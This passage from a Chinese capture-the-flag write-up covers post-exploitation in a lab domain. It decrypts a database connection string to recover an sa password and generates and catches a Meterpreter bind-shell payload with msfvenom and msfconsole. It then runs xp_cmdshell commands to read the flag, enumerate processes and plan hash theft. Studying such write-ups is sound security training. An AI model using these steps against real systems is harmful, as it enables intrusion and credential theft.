            var inputByteArray = Convert.FromBase64String(_inputString);
            var ms = new MemoryStream();
            var cs = new CryptoStream(ms, des.CreateDecryptor(byKey, iv),
                                      CryptoStreamMode.Write);
            cs.Write(inputByteArray, 0, inputByteArray.Length);
            cs.FlushFinalBlock();
            Encoding encoding = new UTF8Encoding();
            _outString = encoding.GetString(ms.ToArray());
            Console.WriteLine("DesEncrypt:"); Console.WriteLine(_outString);
        }
        catch (Exception error) { _noteMessage 27 = error.Message; }
    } } }
得到
    DesEncrypt:
    server=10.10.1.231;uid=sa;pwd=msO.9uXC;database=site
> 顺便再练习一下，整个 msf 上线好了。
>
> 由于不出网不方便打反向连接，这里整个正向连接吧。
>
> 首先利用 `msfvenom` 生成一个正向连接的 payload。
>  
>  
>     msfvenom -p windows/meterpreter/bind_tcp LPORT=23333 -f exe -o 1.exe
>  
>
> 上传后执行它
>
>
> 
>
> 然后查看一下网络连接。
>  
>  
>     netstat -ano
>  
>
> 可以看到成功监听了 23333 端口。说明已经跑起来了。
>
>
> 
>
> 在 msf 里执行监听。
>  
>  
>     msfconsole
>     use exploit/multi/handler
>     set payload windows/meterpreter/bind_tcp
>     set rhost 10.10.1.234
>     set lport 23333
>     exploit
>  
>
> 拿到 Meterpreter 会话。
>
>
> 
## 0x03 10.10.1.231 MSSQL
那就直接从数据库这里日吧。
直接用 `xp_cmdshell` 执行命令好了。
ConnString:
    server=10.10.1.231;uid=sa;pwd=msO.9uXC;database=site;Provider=SQLOLEDB;
发现就是管理员，好唉！
`systeminfo` 看下系统信息。
    主机名: SQLSERVER14
    OS 名称: Microsoft Windows Server 2012 Standard
    OS 版本: 6.2.9200 暂缺 Build 9200
    OS 制造商: Microsoft Corporation
    OS 配置: 成员服务器
    OS 构件类型: Multiprocessor Free
    注册的所有人: Windows 用户
    注册的组织:
    产品 ID: 00184-00070-00000-AAOEM
    初始安装日期: 2021/5/8, 21:38:55
    系统启动时间: 2021/6/2, 22:38:53
    系统制造商: VMware, Inc.
    系统型号: VMware Virtual Platform
    系统类型: x64-based PC
    处理器: 安装了 2 个处理器。
    [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~1796 Mhz
    [02]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~1796 Mhz
    BIOS 版本: Phoenix Technologies LTD 6.00, 2019/7/29
    Windows 目录: C:\Windows
    系统目录: C:\Windows\system32
    启动设备: \Device\HarddiskVolume1
    系统区域设置: zh-cn;中文(中国)
    输入法区域设置: zh-cn;中文(中国)
    时区: (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐
    物理内存总量: 4,095 MB
    可用的物理内存: 2,421 MB
    虚拟内存: 最大值: 8,191 MB
    虚拟内存: 可用: 6,463 MB
    虚拟内存: 使用中: 1,728 MB
    页面文件位置: C:\pagefile.sys
    域: dozer.org
    登录服务器: 暂缺
    修补程序: 安装了 2 个修补程序。
    [01]: KB2999226
    [02]: KB4012214
    网卡: 安装了 1 个 NIC。
    [01]: Intel(R) 82574L 千兆网络连接
    连接名: Ethernet0
    启用 DHCP: 否
    IP 地址
    [01]: 10.10.1.231
    [02]: fe80::f57d:729c:172a:abd6
    Hyper-V 要求: 已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。
好家伙，这台机器在域: dozer.org 里了！
这回 flag 终于在 `Administrator` 用户桌面上了。
另外这个 `DozerOCS.exe` 是什么玩意？
    Exec master.dbo.xp_cmdshell 'type C:\Users\Administrator\Desktop\flag.txt'
    DozerCTF{b305d6b074502f341e793c29d821cadd}
然后再考虑一下获取用户密码，说不定有域管的 hash。
`tasklist` 看一看，发现有杀软。
    映像名称 PID 会话名 会话# 内存使用
    ========================= ======== ================ =========== ============
    System Idle Process 0 Services 0 20 K
    System 4 Services 0 368 K
    smss.exe 332 Services 0 1,044 K
    csrss.exe 432 Services 0 5,964 K
    wininit.exe 512 Services 0 3,900 K
    csrss.exe 520 Console 1 27,296 K
    winlogon.exe 564 Console 1 6,688 K
    services.exe 608 Services 0 9,572 K
    lsass.exe 616 Services 0 13,740 K
    svchost.exe 708 Services 0 9,172 K
    svchost.exe 760 Services 0 6,852 K
    svchost.exe 808 Services 0 16,076 K
    dwm.exe 872 Console 1 48,020 K
    svchost.exe 884 Services 0 44,172 K
    svchost.exe 964 Services 0 13,484 K
    svchost.exe 660 Services 0 16,520 K
    svchost.exe 1108 Services 0 11,084 K
    spoolsv.exe 1276 Services 0 11,364 K
    svchost.exe 1312 Services 0 7,696 K
    sqlservr.exe 1340 Services 0 153,868 K
    sqlwriter.exe 1472 Services 0 5,824 K
    svchost.exe 1520 Services 0 12,036 K
    VGAuthService.exe 1544 Services 0 8,616 K
    vmtoolsd.exe 1580 Services 0 19,000 K
    svchost.exe 1600 Services 0 8,144 K
    avp.exe 1628 Services 0 26,532 K
    svchost.exe 2052 Services 0 4,724 K
    WmiPrvSE.exe 2248 Services 0 24,720 K
    dllhost.exe 2348 Services 0 10,420 K
    msdtc.exe 2564 Services 0 7,268 K
    avpui.exe 3076 Console 1 186,908 K
    taskhostex.exe 3132 Console 1 14,008 K
    explorer.exe 3240 Console 1 103,624 K
    vm3dservice.exe 3944 Console 1 3,588 K
    vmtoolsd.exe 3956 Console 1 32,316 K
    avpsus.exe 3184 Services 0 7,920 K
    WmiPrvSE.exe 2212 Services 0 6,128 K
    powershell.exe 1048 Console 1 71,740 K
    conhost.exe 3148 Console 1 28,332 K
    powershell.exe 3188 Console 1 71,192 K
    conhost.exe 2300 Console 1 27,784 K
    DozerOCS.exe 3728 Console 1 6,948 K
    svchost.exe 4828 Services 0 37,936 K
    csrss.exe 3572 RDP-Tcp#0 2 17,632 K
    winlogon.exe 3844 RDP-Tcp#0 2 5,840 K
    dwm.exe 4440 RDP-Tcp#0 2 31,812 K
    avpui.exe 4124 RDP-Tcp#0 2 664 K
    taskhostex.exe 4752 RDP-Tcp#0 2 8,980 K
    rdpclip.exe 2692 RDP-Tcp#0 2 6,404 K
    msiexec.exe 5100 Services 0 4,772 K
    explorer.exe 3296 RDP-Tcp#0 2 81,692 K
    ServerManager.exe 1176 RDP-Tcp#0 2 113,916 K
    WmiPrvSE.exe 1384 Services 0 10,948 K
    Taskmgr.exe 4444 RDP-Tcp#0 2 37,920 K
    vm3dservice.exe 2204 RDP-Tcp#0 2 3,516 K
    cmd.exe 3556 Services 0 2,084 K
    conhost.exe 4992 Services 0 2,908 K
    tasklist.exe 1196 Services 0 5,500 K
`avp.exe  Kaspersky` 卡巴斯基
看下网络连接，有 3389，应该是远程桌面。
> 这里复现的时候还发现没开远程桌面，然后又按照 0x02 中的方法先打开……
    # netstat -ano
    活动连接
    协议 本地地址 外部地址 状态 PID
    TCP 0.0.0.0:80 0.0.0.0:0 LISTENING 4
    TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 796
    TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4
    TCP 0.0.0.0:1433 0.0.0.0:0 LISTENING 1304
    TCP 0.0.0.0:3389 0.0.0.0:0 LISTENING 1388
    TCP 0.0.0.0:5985 0.0.0.0:0 LISTENING 4
    TCP 0.0.0.0:47001 0.0.0.0:0 LISTENING 4
    TCP 0.0.0.0:49152 0.0.0.0:0 LISTENING 524
    TCP 0.0.0.0:49153 0.0.0.0:0 LISTENING 872
    TCP 0.0.0.0:49154 0.0.0.0:0 LISTENING 928
    TCP 0.0.0.0:49155 0.0.0.0:0 LISTENING 636
    TCP 0.0.0.0:49177 0.0.0.0:0 LISTENING 620
    TCP 0.0.0.0:49182 0.0.0.0:0 LISTENING 636
    TCP 0.0.0.0:49238 0.0.0.0:0 LISTENING 1304
    TCP 10.10.1.231:139 0.0.0.0:0 LISTENING 4
    TCP 10.10.1.231:1433 10.10.1.234:49404 ESTABLISHED 1304